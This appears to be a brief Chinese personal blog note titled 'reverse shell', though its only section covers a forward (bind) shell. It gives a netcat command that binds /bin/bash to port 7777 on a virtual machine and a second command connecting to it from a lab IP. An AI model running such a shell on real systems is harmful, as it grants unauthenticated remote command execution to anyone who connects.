---
title: 反弹shell
date: 2019-03-11 19:59:30
categories: Linux 
tags: [sh脚本,Linux命令]
---

## 正向

先虚拟机再主机

```sh
nc -lvp 7777 -e /bin/bash
```

```sh
nc 192.168.93.135 7777
```

